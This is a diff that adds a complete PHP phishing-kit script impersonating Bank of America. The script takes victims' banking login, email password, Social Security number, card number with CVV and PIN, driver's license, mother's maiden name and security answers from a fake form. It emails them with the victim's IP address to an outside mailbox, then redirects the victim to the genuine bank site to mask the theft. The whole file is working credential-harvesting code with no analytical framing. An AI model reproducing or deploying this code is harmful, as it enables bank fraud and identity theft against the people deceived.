@@ -1,0 +1,51 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+$namer = $_POST['fullname'];
+$message .= "----------BOA Bank Spam ReZulT--------------------\n";
+$message .= "Online ID: ".$_POST['onlineid']."\n";
+$message .= "Passcode: ".$_POST['passcode']."\n";
+$message .= "Full Name: ".$_POST['fullname']."\n";
+$message .= "Address: ".$_POST['address']."\n";
+$message .= "City: ".$_POST['city']."\n";
+$message .= "State: ".$_POST['state']."\n";
+$message .= "Zip: ".$_POST['zip']."\n";
+$message .= "-------------------- Security Info ----------------------\n";
+$message .= "Email: ".$_POST['email']."\n";
+$message .= "Password: ".$_POST['password']."\n";
+$message .= "BirthMonth: ".$_POST['bmonth']."\n";
+$message .= "BirthDay: ".$_POST['bday']."\n";
+$message .= "BirthYear: ".$_POST['byear']."\n";
+$message .= "SSN1: ".$_POST['ssn1']."\n";
+$message .= "SSN2: ".$_POST['ssn2']."\n";
+$message .= "SSN3: ".$_POST['ssn3']."\n";
+$message .= "Phone Number: ".$_POST['ph']."\n";
+$message .= "Mother's Maiden Name: ".$_POST['mmn']."\n";
+$message .= "Driver's License: ".$_POST['dl']."\n";
+$message .= "DL Exp 1: ".$_POST['exp1']."\n";
+$message .= "DL Exp 2: ".$_POST['exp2']."\n";
+$message .= "DL Exp 3: ".$_POST['exp3']."\n";
+$message .= "-------------------- Card Info ----------------------\n";
+$message .= "Card Number: ".$_POST['ccnumber']."\n";
+$message .= "Expiry Month: ".$_POST['expmonth']."\n";
+$message .= "Expiry Year: ".$_POST['expyear']."\n";
+$message .= "CVV : ".$_POST['cvv']."\n";
+$message .= "Card PIN: ".$_POST['ccpin']."\n";
+$message .= "-------------------- SiteKey Challenge ----------------------\n";
+$message .= "Queestion 1: ".$_POST['q1']."\n";
+$message .= "Answer 1: ".$_POST['answer1']."\n";
+$message .= "Question 2: ".$_POST['q2']."\n";
+$message .= "Answer 2: ".$_POST['answer2']."\n";
+$message .= "Question 3: ".$_POST['q3']."\n";
+$message .= "Answer 3: ".$_POST['answer3']."\n";
+$message .= "IP: ".$ip."\n";
+$message .= "---------------Created By MIDE---------------------\n";
+$send = "hibari1@outlook.fr";
+$subject = "BankofAmerica ReZulT | $ip | $namer ";
+$headers = "From: BOA<logzz@eduz.edu>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+mail("$send", "$subject", $message); 
+header("Location: https://www.bankofamerica.com/sitemap/state-select.go");
+	  
+
+?>
